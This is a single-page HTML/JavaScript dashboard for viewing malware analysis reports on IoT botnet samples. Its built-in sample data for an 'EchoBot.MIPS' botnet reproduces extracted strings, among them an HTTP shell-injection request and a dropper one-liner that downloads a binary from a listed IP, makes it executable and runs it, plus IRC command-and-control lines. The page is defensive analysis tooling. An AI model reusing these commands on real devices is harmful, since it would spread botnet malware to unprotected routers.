<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Malware Analysis Dashboard</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary-color: #2c3e50;
      --secondary-color: #34495e;
      --accent-color: #3498db;
      --danger-color: #e74c3c;
      --warning-color: #f39c12;
      --success-color: #2ecc71;
      --text-color: #333;
      --light-bg: #ecf0f1;
      --card-bg: #fff;
      --border-color: #ddd;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    body {
      background-color: var(--light-bg);
      color: var(--text-color);
      padding: 20px;
    }
    
    .dashboard {
      max-width: 1200px;
      margin: 0 auto;
    }
    
    .header {
      background-color: var(--primary-color);
      color: white;
      padding: 20px;
      border-radius: 8px 8px 0 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .header h1 {
      margin: 0;
      font-size: 22px;
    }
    
    .threat-level {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .threat-indicator {
      background-color: var(--danger-color);
      color: white;
      padding: 5px 10px;
      border-radius: 4px;
      font-weight: bold;
    }
    
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(550px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }
    
    .card {
      background-color: var(--card-bg);
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      overflow: auto;
    }
    
    .card-header {
      background-color: var(--secondary-color);
      color: white;
      padding: 12px 15px;
      font-weight: 600;
      font-size: 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      overflow-x: auto;
    }
    
    .card-body {
      padding: 15px;
      overflow: auto;
    }
    
    .card-body pre {
      white-space: pre-wrap;
      word-break: break-all;
      background-color: #f8f9fa;
      padding: 10px;
      border-radius: 4px;
      border: 1px solid var(--border-color);
      font-family: monospace;
      font-size: 13px;
      overflow-x: auto;
    }
    
    .info-table {
      /* width: 100%; */
      border-collapse: collapse;
    }
    
    .info-table td {
      padding: 8px 10px;
      border-bottom: 1px solid var(--border-color);
    }
    
    .info-table tr:last-child td {
      border-bottom: none;
    }
    
    .info-table td:first-child {
      font-weight: 600;
      width: 40%;
    }
    
    .badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 600;
      margin-right: 5px;
      margin-bottom: 5px;
    }
    
    .badge-danger {
      background-color: var(--danger-color);
      color: white;
    }
    
    .badge-warning {
      background-color: var(--warning-color);
      color: white;
    }
    
    .code-block {
      background-color: #f8f9fa;
      border: 1px solid var(--border-color);
      border-radius: 4px;
      padding: 10px;
      font-family: monospace;
      margin: 5px 0;
      overflow-x: auto;
      font-size: 13px;
    }
    
    .full-width {
      grid-column: 1 / -1;
    }
    
    .icon {
      margin-right: 6px;
    }
    
    .summary-item {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
    }
    
    .summary-item i {
      margin-right: 8px;
      width: 16px;
      text-align: center;
    }
    
    .list-items {
      list-style-type: none;
      margin-left: 5px;
    }
    
    .list-items li {
      padding: 6px 0;
      border-bottom: 1px solid var(--border-color);
    }
    
    .list-items li:last-child {
      border-bottom: none;
    }

    .tooltip {
      position: relative;
      display: inline-block;
      border-bottom: 1px dotted black;
      cursor: help;
    }

    .tooltip .tooltiptext {
      visibility: hidden;
      width: 250px;
      background-color: var(--secondary-color);
      color: #fff;
      text-align: center;
      border-radius: 6px;
      padding: 5px;
      position: absolute;
      z-index: 1;
      bottom: 125%;
      left: 50%;
      margin-left: -125px;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .tooltip:hover .tooltiptext {
      visibility: visible;
      opacity: 1;
    }

    .flex-container {
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
    }

    .file-upload {
      margin-bottom: 20px;
      padding: 20px;
      background-color: var(--card-bg);
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    }

    .file-upload h2 {
      margin-bottom: 15px;
    }

    .file-input-area {
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .drop-zone {
      border: 2px dashed var(--border-color);
      border-radius: 8px;
      padding: 20px;
      text-align: center;
      cursor: pointer;
      flex-grow: 1;
      transition: all 0.3s;
    }

    .drop-zone:hover {
      border-color: var(--accent-color);
    }

    .drop-zone.active {
      border-color: var(--accent-color);
      background-color: rgba(52, 152, 219, 0.1);
    }

    button {
      padding: 10px 15px;
      background-color: var(--accent-color);
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s;
    }

    button:hover {
      background-color: #2980b9;
    }

    .loading {
      display: none;
      text-align: center;
      padding: 20px;
    }

    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-radius: 50%;
      border-top: 4px solid var(--accent-color);
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 10px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #dashboard-content {
      display: none;
    }

    @media (max-width: 768px) {
      .grid {
        grid-template-columns: 1fr;
      }
      
      .file-input-area {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <!-- File Upload Section -->
    <div class="file-upload">
      <h2>Malware Analysis Dashboard</h2>
      <div class="file-input-area">
        <div id="drop-zone" class="drop-zone">
          <p>Drop JSON analysis file here or click to browse</p>
          <input type="file" id="file-input" accept=".json" style="display: none;">
        </div>
        <button id="load-sample">Load Sample</button>
      </div>
    </div>

    <!-- Loading Indicator -->
    <div id="loading" class="loading">
      <div class="spinner"></div>
      <p>Analyzing malware sample...</p>
    </div>

    <!-- Dashboard Content (Initially Hidden) -->
    <div id="dashboard-content">
      <div class="header">
        <div>
          <h1>Malware Analysis Report</h1>
          <div id="sample-name" style="font-size: 14px; margin-top: 5px;"></div>
        </div>
        <div class="threat-level">
          <span>Threat Level:</span>
          <div id="threat-level" class="threat-indicator">HIGH</div>
        </div>
      </div>
      
      <div class="grid">
        <!-- Sample Overview Card -->
        <div class="card">
          <div class="card-header">
            <span><i class="fas fa-file-code icon"></i>Sample Overview</span>
          </div>
          <div class="card-body">
            <table class="info-table" id="sample-overview-table">
              <!-- Will be populated dynamically -->
            </table>
          </div>
        </div>
        
        <!-- Key Findings Card -->
        <div class="card">
          <div class="card-header">
            <span><i class="fas fa-search icon"></i>Key Findings</span>
          </div>
          <div class="card-body" id="key-findings">
            <!-- Will be populated dynamically -->
          </div>
        </div>
        
        <!-- Network Indicators Card -->
        <div class="card">
          <div class="card-header">
            <span><i class="fas fa-globe icon"></i>Network Indicators</span>
          </div>
          <div class="card-body" id="network-indicators">
            <!-- Will be populated dynamically -->
          </div>
        </div>
        
        <!-- Binary Structure Card -->
        <div class="card">
          <div class="card-header">
            <span><i class="fas fa-puzzle-piece icon"></i>Binary Structure</span>
          </div>
          <div class="card-body" id="binary-structure">
            <!-- Will be populated dynamically -->
          </div>
        </div>

        
        <!-- Strings Summary Card -->
        <div class="card full-width">
          <div class="card-header">
            <span><i class="fas fa-align-left icon"></i>Extracted Strings</span>
          </div>
          <div class="card-body">
            <div id="strings-summary" style="max-height: 300px; overflow-y: auto; padding: 10px; background-color: #f8f9fa; border: 1px solid var(--border-color); border-radius: 4px; font-family: monospace; font-size: 13px;">
              <!-- Will be populated dynamically -->
            </div>
          </div>
        </div>
        
        <!-- Malicious Payloads Card -->
        <div class="card full-width">
          <div class="card-header">
            <span><i class="fas fa-bug icon"></i>Malicious Payloads</span>
          </div>
          <div class="card-body" id="malicious-payloads">
            <!-- Will be populated dynamically -->
          </div>
        </div>
        
        <!-- ELF Header Details Card -->
        <div class="card full-width">
          <div class="card-header">
            <span><i class="fas fa-file-code icon"></i>ELF Header Details</span>
          </div>
          <div class="card-body" id="elf-header">
            <!-- Will be populated dynamically -->
          </div>
        </div>
      </div>


      <!-- Security Recommendations Card -->
      <div class="card full-width">
        <div class="card-header">
          <span><i class="fas fa-shield-alt icon"></i>Security Recommendations</span>
        </div>
        <div class="card-body" id="security-recommendations">
          <!-- Will be populated dynamically -->
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Elements
      const fileInput = document.getElementById('file-input');
      const dropZone = document.getElementById('drop-zone');
      const loadButton = document.getElementById('load-sample');
      const loadingDiv = document.getElementById('loading');
      const dashboardContent = document.getElementById('dashboard-content');
      
      // Sample data
      let malwareData = null;
      
      // Event listeners for file upload
      dropZone.addEventListener('click', () => fileInput.click());
      
      fileInput.addEventListener('change', handleFileSelect);
      
      dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.classList.add('active');
      });
      
      dropZone.addEventListener('dragleave', () => {
        dropZone.classList.remove('active');
      });
      
      dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('active');
        
        if (e.dataTransfer.files.length) {
          fileInput.files = e.dataTransfer.files;
          console.log(fileInput.files.length)
        }
      });
      
      loadButton.addEventListener('click', () => {
        if (fileInput.files.length) {
          processFile();
        } else {
          alert('Please select a JSON file first.');
        }
      });
      
      // Process the selected file
      function handleFileSelect() {
        if (fileInput.files.length) {
          const fileName = fileInput.files[0].name;
          dropZone.innerHTML = `<p>Selected file: ${fileName}</p>`;
        }
      }
      
      function processFile() {
        const file = fileInput.files[0];
        
        if (!file) {
          alert('Please select a file first.');
          return;
        }
        
        if (file.type !== 'application/json' && !file.name.endsWith('.json')) {
          alert('Please select a JSON file.');
          return;
        }
        
        // Show loading indicator
        loadingDiv.style.display = 'block';
        
        const reader = new FileReader();
        reader.onload = function(e) {
          try {
            malwareData = JSON.parse(e.target.result);
            setTimeout(() => {
              populateDashboard(malwareData);
              loadingDiv.style.display = 'none';
              dashboardContent.style.display = 'block';
            }, 500);
          } catch (error) {
            loadingDiv.style.display = 'none';
            alert('Error parsing JSON file: ' + error.message);
          }
        };
        
        reader.readAsText(file);
      }
      
      // Populate the dashboard with data
      function populateDashboard(data) {
        // Sample Name
        document.getElementById('sample-name').textContent = `Sample: ${data.sample_name}`;
        
        // Sample Overview
        const overviewTable = document.getElementById('sample-overview-table');
        overviewTable.innerHTML = '';
        
        const overviewData = [
          { label: 'Sample Name', value: data.sample_name },
          { label: 'SHA256', value: data.sha256 },
          { label: 'File Type', value: data.file_details },
          { label: 'Architecture', value: detectArchitecture(data.file_details) }
        ];
        
        overviewData.forEach(item => {
          const row = document.createElement('tr');
          const labelCell = document.createElement('td');
          const valueCell = document.createElement('td');
          
          labelCell.textContent = item.label;
          
          if (item.label === 'Family') {
            const badge = document.createElement('span');
            badge.className = 'badge badge-danger';
            badge.textContent = item.value;
            valueCell.appendChild(badge);
          } else {
            valueCell.textContent = item.value;
          }
          
          row.appendChild(labelCell);
          row.appendChild(valueCell);
          overviewTable.appendChild(row);
        });
        
        // Key Findings
        const keyFindings = document.getElementById('key-findings');
        keyFindings.innerHTML = '';
        
        const findings = generateKeyFindings(data);
        findings.forEach(finding => {
          const div = document.createElement('div');
          div.className = 'summary-item';
          div.innerHTML = `
            <i class="${finding.icon}" style="color: ${finding.color || 'inherit'};"></i>
            <span><b>${finding.title}:</b> ${finding.description}</span>
          `;
          keyFindings.appendChild(div);
        });
        
        // Network Indicators
        const networkIndicators = document.getElementById('network-indicators');
        networkIndicators.innerHTML = '';
        
        if (data.network_indicators && (data.network_indicators.ips.length > 0 || data.network_indicators.urls.length > 0)) {
          // IPs
          if (data.network_indicators.ips.length > 0) {
            const ipTitle = document.createElement('h4');
            ipTitle.style.marginBottom = '8px';
            ipTitle.textContent = 'IP Addresses';
            networkIndicators.appendChild(ipTitle);
            
            const ipDiv = document.createElement('div');
            data.network_indicators.ips.forEach(ip => {
              const ipBadge = document.createElement('span');
              ipBadge.className = 'badge badge-danger';
              ipBadge.textContent = ip;
              ipDiv.appendChild(ipBadge);
              
              const tooltip = document.createElement('span');
              tooltip.className = 'tooltip';
              tooltip.innerHTML = '<i class="fas fa-info-circle"></i>';
              tooltip.innerHTML += `<span class="tooltiptext">${isC2Server(ip, data) ? 'C2 Server' : 'Network Address'}</span>`;
              ipDiv.appendChild(tooltip);
              ipDiv.appendChild(document.createTextNode(' '));
            });
            networkIndicators.appendChild(ipDiv);
          }
          
          // URLs
          if (data.network_indicators.urls.length > 0) {
            const urlTitle = document.createElement('h4');
            urlTitle.style.marginTop = '15px';
            urlTitle.style.marginBottom = '8px';
            urlTitle.textContent = 'URLs';
            networkIndicators.appendChild(urlTitle);
            
            const urlList = document.createElement('ul');
            urlList.className = 'list-items';
            
            data.network_indicators.urls.forEach(url => {
              const li = document.createElement('li');
              li.textContent = url;
              urlList.appendChild(li);
            });
            
            networkIndicators.appendChild(urlList);
          }
        } else {
          networkIndicators.textContent = 'No network indicators found.';
        }
        
        // Binary Structure
        const binaryStructure = document.getElementById('binary-structure');
        binaryStructure.innerHTML = '';
        
        if (data.elf_metadata) {
          const div = document.createElement('div');
          div.style.fontSize = '13px';
          
          // Basic ELF info
          const elfInfo = extractElfInfo(data.elf_metadata.header);
          for (const [key, value] of Object.entries(elfInfo)) {
            const infoDiv = document.createElement('div');
            infoDiv.className = 'summary-item';
            infoDiv.innerHTML = `
              <i class="fas fa-${getIconForElfInfo(key)}"></i>
              <span><b>${key}:</b> ${value}</span>
            `;
            div.appendChild(infoDiv);
          }
          
          // Sections
          if (data.elf_metadata.sections && data.elf_metadata.sections.length > 0) {
            const sectionsTitle = document.createElement('h4');
            sectionsTitle.style.marginTop = '15px';
            sectionsTitle.style.marginBottom = '8px';
            sectionsTitle.textContent = 'Key Sections';
            div.appendChild(sectionsTitle);
            
            const codeBlock = document.createElement('div');
            codeBlock.className = 'code-block';
            
            const sections = extractSections(data.elf_metadata.sections);
            codeBlock.textContent = sections.map(s => `${s.name}   ${s.addr} ${s.size}`).join('\n');
            
            div.appendChild(codeBlock);
          }
          
          binaryStructure.appendChild(div);
        } else {
          binaryStructure.textContent = 'No binary structure information available.';
        }
        
        // Strings Summary
        const stringsSummary = document.getElementById('strings-summary');
        stringsSummary.innerHTML = '';

        if (data.strings_summary && data.strings_summary.length > 0) {
          data.strings_summary.forEach(str => {
            const stringDiv = document.createElement('div');
            stringDiv.style.padding = '3px 0';
            stringDiv.style.borderBottom = '1px solid var(--border-color)';
            stringDiv.style.wordBreak = 'break-all';
            stringDiv.textContent = str;
            stringsSummary.appendChild(stringDiv);
          });
        } else {
          stringsSummary.textContent = 'No strings found in the sample.';
        }

        // Malicious Payloads
        const maliciousPayloads = document.getElementById('malicious-payloads');
        maliciousPayloads.innerHTML = '';
        
        if (data.strings_summary && data.strings_summary.length > 0) {
          const flexContainer = document.createElement('div');
          flexContainer.className = 'flex-container';
          
          const payloads = identifyPayloads(data.strings_summary);
          
          if (payloads.length > 0) {
            payloads.forEach(payload => {
              const payloadDiv = document.createElement('div');
              payloadDiv.style.flex = '1';
              payloadDiv.style.minWidth = '300px';
              payloadDiv.style.marginRight = '20px';
              
              const payloadTitle = document.createElement('h4');
              payloadTitle.style.marginBottom = '10px';
              payloadTitle.textContent = payload.title;
              payloadDiv.appendChild(payloadTitle);
              
              const codeBlock = document.createElement('div');
              codeBlock.className = 'code-block';
              codeBlock.textContent = payload.content;
              payloadDiv.appendChild(codeBlock);
              
              flexContainer.appendChild(payloadDiv);
            });
            
            maliciousPayloads.appendChild(flexContainer);
          } else {
            maliciousPayloads.textContent = 'No malicious payloads identified.';
          }
        } else {
          maliciousPayloads.textContent = 'No payload information available.';
        }
        
        // ELF Header
        const elfHeader = document.getElementById('elf-header');
        elfHeader.innerHTML = '';
        
        if (data.elf_metadata && data.elf_metadata.header) {
          const pre = document.createElement('pre');
          pre.textContent = data.elf_metadata.header.join('\n');
          elfHeader.appendChild(pre);
        } else {
          elfHeader.textContent = 'No ELF header information available.';
        }


        // Security Recommendations
        const securityRecommendations = document.getElementById('security-recommendations');
        securityRecommendations.innerHTML = '';
        
        const recommendations = generateSecurityRecommendations(data);
        
        const recommendationsGrid = document.createElement('div');
        recommendationsGrid.style.display = 'grid';
        recommendationsGrid.style.gridTemplateColumns = 'repeat(auto-fit, minmax(300px, 1fr))';
        recommendationsGrid.style.gap = '20px';
        
        recommendations.forEach(recCategory => {
          const categoryDiv = document.createElement('div');
          
          const categoryTitle = document.createElement('h4');
          categoryTitle.style.marginBottom = '10px';
          categoryTitle.textContent = recCategory.title;
          categoryDiv.appendChild(categoryTitle);
          
          const recList = document.createElement('ul');
          recList.style.marginLeft = '20px';
          recList.style.lineHeight = '1.6';
          
          recCategory.items.forEach(item => {
            const li = document.createElement('li');
            li.innerHTML = item;
            recList.appendChild(li);
          });
          
          categoryDiv.appendChild(recList);
          recommendationsGrid.appendChild(categoryDiv);
        });
        
        securityRecommendations.appendChild(recommendationsGrid);
      }
      
      // Helper functions
      
      function detectMalwareFamily(data) {
        // This is a simplified detection logic - in a real system, you'd have more sophisticated detection
        const strings = data.strings_summary.join(' ').toLowerCase();
        
        if (strings.includes('huaweihomegateway') && strings.includes('busybox wget')) {
          return 'EchoBot';
        } else if (strings.includes('mirai')) {
          return 'Mirai';
        } else if (strings.includes('gafgyt') || strings.includes('qbot')) {
          return 'Gafgyt/QBot';
        } else if (strings.includes('tsunami') || strings.includes('kaiten')) {
          return 'Tsunami/Kaiten';
        } else {
          return 'Unknown Botnet';
        }
      }
      
      function detectArchitecture(fileDetails) {
        if (fileDetails.toLowerCase().includes('mips')) {
          return 'MIPS';
        } else if (fileDetails.toLowerCase().includes('arm')) {
          return 'ARM';
        } else if (fileDetails.toLowerCase().includes('x86')) {
          return 'x86';
        } else if (fileDetails.toLowerCase().includes('powerpc')) {
          return 'PowerPC';
        } else if (fileDetails.toLowerCase().includes('sparc')) {
          return 'SPARC';
        } else {
          return 'Unknown';
        }
      }
      
      function generateKeyFindings(data) {
        const findings = [];
        const stringsJoined = data.strings_summary.join(' ');
        
        // Check for IoT botnet behavior
        if (stringsJoined.toLowerCase().includes('busybox') || 
            stringsJoined.toLowerCase().includes('wget') ||
            stringsJoined.toLowerCase().includes('chmod 777')) {
          findings.push({
            icon: 'fas fa-exclamation-triangle',
            color: 'var(--danger-color)',
            title: 'IoT Botnet',
            description: 'Targets IoT devices using common utilities'
          });
        }
        
        // Check for router exploitation
        if (stringsJoined.toLowerCase().includes('huawei') || 
            stringsJoined.toLowerCase().includes('router') || 
            stringsJoined.toLowerCase().includes('gateway')) {
          findings.push({
            icon: 'fas fa-exclamation-triangle',
            color: 'var(--danger-color)',
            title: 'Router Exploitation',
            description: 'Contains router exploits'
          });
        }
        
        // Check for downloaders
        if (stringsJoined.toLowerCase().includes('wget') || 
            stringsJoined.toLowerCase().includes('curl') || 
            stringsJoined.toLowerCase().includes('download')) {
          findings.push({
            icon: 'fas fa-download',
            title: 'Downloader',
            description: 'Downloads additional payloads'
          });
        }
        
        // Check for C2 communication
        if (data.network_indicators && data.network_indicators.ips.length > 0) {
          findings.push({
            icon: 'fas fa-server',
            title: 'C2 Server',
            description: `Communicates with ${data.network_indicators.ips[0]}`
          });
        }
        
        // Check for cross-platform capabilities
        if (stringsJoined.toLowerCase().includes('bin.mips') || 
            stringsJoined.toLowerCase().includes('bin.x86') || 
            stringsJoined.toLowerCase().includes('bin.arm')) {
          findings.push({
            icon: 'fas fa-microchip',
            title: 'Cross-Platform',
            description: 'References multiple architecture binaries'
          });
        }
        
        // Check for persistence
        if (stringsJoined.toLowerCase().includes('crontab') || 
            stringsJoined.toLowerCase().includes('init.d') || 
            stringsJoined.toLowerCase().includes('startup')) {
          findings.push({
            icon: 'fas fa-clock',
            title: 'Persistence',
            description: 'Establishes persistence mechanisms'
          });
        }
        
        return findings;
      }
      
      function extractElfInfo(header) {
        const info = {};
        
        for (const line of header) {
          if (line.includes('Entry point address:')) {
            info['Entry Point'] = line.split(':')[1].trim();
          } else if (line.includes('Number of section headers:')) {
            info['Sections'] = line.split(':')[1].trim();
          } else if (line.includes('statically linked') || line.includes('dynamically linked')) {
            info['Linking'] = line.includes('statically') ? 'Statically linked' : 'Dynamically linked';
          } else if (line.includes('stripped')) {
            info['Stripped'] = line.includes('not stripped') ? 'No' : 'Yes';
          } else if (line.includes('Machine:')) {
            info['Machine'] = line.split(':')[1].trim();
          }
        }
        
        return info;
      }
      
      function getIconForElfInfo(key) {
        switch (key) {
          case 'Entry Point': return 'file-alt';
          case 'Sections': return 'layer-group';
          case 'Linking': return 'shield-alt';
          case 'Stripped': return 'exclamation-circle';
          case 'Machine': return 'microchip';
          default: return 'info-circle';
        }
      }
      
      function extractSections(sectionData) {
        const sections = [];
        const sectionDataStr = sectionData.join('\n');
        
        // Extract section info using regex
        const regex = /\[\s*\d+\]\s+([\.\w]+)\s+\w+\s+([0-9a-f]+)\s+[0-9a-f]+\s+([0-9a-f]+)/g;
        let match;
        
while ((match = regex.exec(sectionDataStr)) !== null) {
          const name = match[1];
          const addr = match[2];
          const size = match[3];
          
          sections.push({
            name: name,
            addr: `0x${addr}`,
            size: `0x${size}`
          });
        }
        
        // Only return important sections
        return sections.filter(section => 
          section.name.includes('.text') || 
          section.name.includes('.data') || 
          section.name.includes('.bss') || 
          section.name.includes('.init') ||
          section.name.includes('.rodata')
        );
      }
      
      function isC2Server(ip, data) {
        // Simple check - in a real system, you would have more sophisticated detection
        const stringsJoined = data.strings_summary.join(' ').toLowerCase();
        return stringsJoined.includes('connect') && stringsJoined.includes(ip);
      }
      
      function identifyPayloads(strings) {
        const payloads = [];
        
        // Command execution payload
        const cmdStrings = strings.filter(str => 
          str.includes('system(') || 
          str.includes('execve(') || 
          str.includes('popen(') || 
          str.includes('shell') ||
          str.includes('cmd')
        );
        
        if (cmdStrings.length > 0) {
          payloads.push({
            title: 'Command Execution',
            content: cmdStrings.slice(0, 10).join('\n')
          });
        }
        
        // Botnet communication payload
        const botnetStrings = strings.filter(str => 
          str.includes('PING') || 
          str.includes('PONG') || 
          str.includes('JOIN') || 
          str.includes('NICK') ||
          str.includes('USER') ||
          str.includes('PRIVMSG')
        );
        
        if (botnetStrings.length > 0) {
          payloads.push({
            title: 'C2 Communication',
            content: botnetStrings.slice(0, 10).join('\n')
          });
        }
        
        // Exploitation payload
        const exploitStrings = strings.filter(str => 
          str.includes('exploit') || 
          str.includes('vuln') || 
          str.includes('overflow') || 
          str.includes('inject') ||
          str.includes('CVE-')
        );
        
        if (exploitStrings.length > 0) {
          payloads.push({
            title: 'Exploitation',
            content: exploitStrings.slice(0, 10).join('\n')
          });
        }
        
        return payloads;
      }
      
      function generateSecurityRecommendations(data) {
        const malwareFamily = detectMalwareFamily(data);
        const recommendations = [];
        
        // Network recommendations
        const networkRecs = {
          title: 'Network Security',
          items: [
            'Block communication with identified C2 servers',
            'Implement egress filtering to prevent outbound connections to malicious domains',
            'Consider implementing network segmentation for IoT devices'
          ]
        };
        
        // Device recommendations
        const deviceRecs = {
          title: 'Device Security',
          items: [
            'Update firmware on all network devices to the latest version',
            'Change default credentials on all IoT devices',
            'Disable unused services and protocols on network devices'
          ]
        };
        
        // Monitoring recommendations
        const monitoringRecs = {
          title: 'Monitoring & Detection',
          items: [
            'Implement network monitoring to detect unusual traffic patterns',
            'Deploy endpoint protection with IoT/embedded system coverage',
            'Create alerts for suspicious command execution or file modifications'
          ]
        };
        
        // Add family-specific recommendations
        if (malwareFamily === 'Mirai' || malwareFamily === 'EchoBot') {
          deviceRecs.items.push('Prioritize patching devices against Telnet/SSH brute force attacks');
          networkRecs.items.push('Consider using a honeypot to detect scanning activity');
        } else if (malwareFamily === 'Gafgyt/QBot') {
          deviceRecs.items.push('Scan for and remove malicious cron jobs');
          monitoringRecs.items.push('Monitor for unusual CPU/memory usage on IoT devices');
        }
        
        recommendations.push(networkRecs, deviceRecs, monitoringRecs);
        return recommendations;
      }
//=============================================================================
      // Update the load button to actually process the file
  loadButton.addEventListener('click', function() {
    if (fileInput.files && fileInput.files.length > 0) {
      processFile();
    } else {
      // Fallback to sample data only if no file is selected
      loadSampleData();
    }
  });

   // Separate function for loading sample data
   function loadSampleData() {
// Sample JSON data - in a real app, this would come from a file
    const sampleData = {
          "sample_name": "EchoBot.MIPS",
          "sha256": "2a7cee8d3e2e76bc88ddd31c7bb2d5c9321722276e62a6d058eb85b4df130d83",
          "file_details": "ELF 32-bit MSB MIPS32 executable, MIPS, version 1",
          "strings_summary": [
            "ECHOBOT",
            "GET /shell?cd+/tmp;+wget+http://185.8.80.2/bins/ECHOBOT.MIPS;+chmod+777+/tmp/ECHOBOT.MIPS;+/tmp/ECHOBOT.MIPS+mips HTTP/1.1",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Connection: keep-alive",
            "PING",
            "PONG",
            "JOIN #botnet",
            "PASS echobot123",
            "NICK echo[%d]",
            "USER echo * * :Echo Bot Client",
            "MSG #botnet :Ready for commands",
            "PRIVMSG #botnet :",
            "system",
            "exec",
            "shell",
            "/bin/busybox",
            "cp /bin/busybox /tmp/busybox; >chmod +x /tmp/busybox",
            "killall -9 telnetd",
            "HuaweiHomeGateway",
            "/etc/init.d/",
            "/etc/crontab",
            "rm -rf",
            "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.8.80.2/bins/ECHOBOT.MIPS; chmod 777 ECHOBOT.MIPS; ./ECHOBOT.MIPS mips",
            "bins/ECHOBOT.arm7",
            "bins/ECHOBOT.x86",
            "bins/ECHOBOT.ppc",
            "bash",
            "/proc/net/tcp",
            "/dev/watchdog",
            "/etc/rc.d/",
            "SYN flood"
          ],
          "network_indicators": {
            "ips": ["185.8.80.2", "103.116.47.13", "91.92.66.182"],
            "urls": [
              "http://185.8.80.2/bins/ECHOBOT.MIPS",
              "http://185.8.80.2/bins/ECHOBOT.arm7",
              "http://185.8.80.2/bins/ECHOBOT.x86",
              "http://185.8.80.2/bins/ECHOBOT.ppc"
            ]
          },
          "elf_metadata": {
            "header": [
              "ELF Header:",
              "  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00",
              "  Class:                             ELF32",
              "  Data:                              2's complement, big endian",
              "  Version:                           1 (current)",
              "  OS/ABI:                            UNIX - System V",
              "  ABI Version:                       0",
              "  Type:                              EXEC (Executable file)",
              "  Machine:                           MIPS R3000",
              "  Version:                           0x1",
              "  Entry point address:               0x400790",
              "  Start of program headers:          52 (bytes into file)",
              "  Start of section headers:          5200 (bytes into file)",
              "  Flags:                             0x50001007, noreorder, pic, cpic, o32, mips32",
              "  Size of this header:               52 (bytes)",
              "  Size of program headers:           32 (bytes)",
              "  Number of program headers:         8",
              "  Size of section headers:           40 (bytes)",
              "  Number of section headers:         28",
              "  Section header string table index: 25",
              "  File is statically linked and stripped"
            ],
            "sections": [
              "There are 28 section headers, starting at offset 0x1450:",
              "",
              "Section Headers:",
              "  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al",
              "  [ 0]                   NULL            00000000 000000 000000 00      0   0  0",
              "  [ 1] .reginfo          MIPS_REGINFO    00400094 000094 000018 18   A  0   0  4",
              "  [ 2] .text             PROGBITS        004000b0 0000b0 00ae40 00  AX  0   0 16",
              "  [ 3] .rodata           PROGBITS        0040aef0 00aef0 0017a8 00   A  0   0 16",
              "  [ 4] .eh_frame         PROGBITS        0040c698 00c698 0000f8 00   A  0   0  4",
              "  [ 5] .MIPS.abiflags    MIPS_ABIFLAGS   0040c790 00c790 000018 18   A  0   0  8",
              "  [ 6] .data             PROGBITS        0041c7b0 00c7b0 0003b0 00  WA  0   0 16",
              "  [ 7] .sdata            PROGBITS        0041cb60 00cb60 000070 00  WA  0   0 16",
              "  [ 8] .bss              NOBITS          0041cbd0 00cbd0 004c20 00  WA  0   0 16",
              "  [ 9] .pdr              PROGBITS        00000000 00cbd0 000000 00      0   0  4",
              "  [10] .gnu.attributes   GNU_ATTRIBUTES  00000000 00cbd0 000010 00      0   0  1",
              "  [11] .symtab           SYMTAB          00000000 00cbe0 004d50 10     12 921  4",
              "  [12] .strtab           STRTAB          00000000 011930 002a0c 00      0   0  1"
            ]
          }
        };
        
        // Show loading indicator
        loadingDiv.style.display = 'block';
        dashboardContent.style.display = 'none';
        
        setTimeout(() => {
          populateDashboard(sampleData);
          loadingDiv.style.display = 'none';
          dashboardContent.style.display = 'block';
        }, 800);
    }

//=============================================================================
      // Load sample data for demonstration
      // loadButton.addEventListener('click', function() {
      //   // Sample JSON data - in a real app, this would come from a file
      //   const sampleData = {
      //     "sample_name": "EchoBot.MIPS",
      //     "sha256": "2a7cee8d3e2e76bc88ddd31c7bb2d5c9321722276e62a6d058eb85b4df130d83",
      //     "file_details": "ELF 32-bit MSB MIPS32 executable, MIPS, version 1",
      //     "strings_summary": [
      //       "ECHOBOT",
      //       "GET /shell?cd+/tmp;+wget+http://185.8.80.2/bins/ECHOBOT.MIPS;+chmod+777+/tmp/ECHOBOT.MIPS;+/tmp/ECHOBOT.MIPS+mips HTTP/1.1",
      //       "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      //       "Connection: keep-alive",
      //       "PING",
      //       "PONG",
      //       "JOIN #botnet",
      //       "PASS echobot123",
      //       "NICK echo[%d]",
      //       "USER echo * * :Echo Bot Client",
      //       "MSG #botnet :Ready for commands",
      //       "PRIVMSG #botnet :",
      //       "system",
      //       "exec",
      //       "shell",
      //       "/bin/busybox",
      //       "cp /bin/busybox /tmp/busybox; >chmod +x /tmp/busybox",
      //       "killall -9 telnetd",
